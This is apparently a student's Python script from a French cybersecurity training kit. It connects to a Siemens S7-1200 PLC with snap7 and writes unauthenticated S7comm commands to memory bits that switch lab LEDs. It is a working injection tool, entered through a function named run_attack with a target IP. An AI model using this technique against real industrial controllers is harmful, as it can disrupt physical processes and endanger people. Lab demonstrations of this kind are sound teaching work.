###############################################################################
# Projet : Mallette de Test de Sécurité Industrielle
# Fichier : injectionLED.py
# Auteurs : Maxens 
# Version : 7.0 (Version Intégrée)
# Date : 2026
# Formation : BTS CIEL (Cybersécurité, Informatique, Électronique)
# Description : Module d'injection S7comm pour interagir directement avec 
#               les variables (%M0.0 à %M0.2) de l'automate et contrôler les ampoules.
###############################################################################

import sys
import snap7  # On utilise la bibliothèque standard pour communiquer avec Siemens.

# Mapping : nom -> position du bit sur l'OCTET 0 (%M0.0, %M0.1, %M0.2)
LEDS = {
    "rouge": 0, "r": 0,   # Bit 0
    "vert": 1, "v": 1,    # Bit 1
    "bleu": 2, "b": 2     # Bit 2
}

client = snap7.client.Client()

def get_m0_byte():
    """Lit l'octet M0 complet (8 bits)"""
    data = client.mb_read(0, 1)  # On lit l'octet d'adresse 0, sur une longueur de 1.
    return data[0]

def set_led(bit_pos, state):
    """Modifie uniquement un bit spécifique de l'octet M0"""
    current_byte = get_m0_byte()
    
    if state:
        # ALLUMER : On utilise OU (|) pour fusionner deux états
        new_byte = current_byte | (1 << bit_pos)
    else:
        # ETEINDRE : On utilise ~ pour inverser le 1 grâce à un masque et le &
        new_byte = current_byte & ~(1 << bit_pos)
    
    client.mb_write(0, 1, bytes([new_byte]))

def show_status():
    byte = get_m0_byte()
    # On décale chaque bit le plus à droite et on demande si l'octet vaut 1
    r = (byte >> 0) & 1
    v = (byte >> 1) & 1
    b = (byte >> 2) & 1
    
    print(f"\n🔍 État LEDs (Octet M0):")
    print(f"   Rouge(%M0.0): {'🔴ON' if r else '⚫OFF'}")
    print(f"   Vert(%M0.1):  {'🟢ON' if v else '⚫OFF'}")
    print(f"   Bleu(%M0.2):  {'🔵ON' if b else '⚫OFF'}")

def run_attack(target_ip):
    try:
        print("\n" + "="*60)
        print(f"🚀 INJECTION S7COMM (CONTRÔLE DES LEDS) SUR : {target_ip}")
        print("="*60)
        print(f"Connexion à {target_ip}...") 
        
        client.connect(target_ip, 0, 1)  # On établit la session S7 pour un S7-1200
        print("✅ Connecté avec succès\n")
        
        while True:
            show_status()  # On affiche l'état réel AVANT de demander un choix
            print("\n1. Allumer | 2. Éteindre | 3. Tout éteindre | 4. Quitter")
            choix = input("→ ").strip()
            
            if choix == "4": 
                break
            
            if choix == "3":
                client.mb_write(0, 1, bytes([0]))  # On met tout l'octet à 0
                print("💡 Toutes les LEDs éteintes")
                continue
            
            if choix in ["1", "2"]:
                couleur = input("Couleur (r/v/b): ").lower()
                if couleur in LEDS:
                    bit = LEDS[couleur]  # On récupère l'index (0, 1 ou 2)
                    allumer = (choix == "1")  # True si on a tapé 1, False sinon
                    set_led(bit, allumer)  # On envoie ces deux infos à la fonction de calcul
                    print(f"✅ Commande injectée pour la LED {couleur}")
                else:
                    print("❌ Couleur invalide")
                    
    except Exception as e:
        print(f"❌ Erreur lors de l'injection : {e}")
    finally:
        if client.get_connected():
            client.disconnect()
            print("🔌 Déconnecté de l'automate")

if __name__ == "__main__":
    # Si le script reçoit l'IP depuis scan.py
    if len(sys.argv) > 1:
        run_attack(sys.argv[1])
    else:
        # Mode autonome classique si lancé tout seul
        target = input("[?] IP de l'automate cible : ")
        run_attack(target)
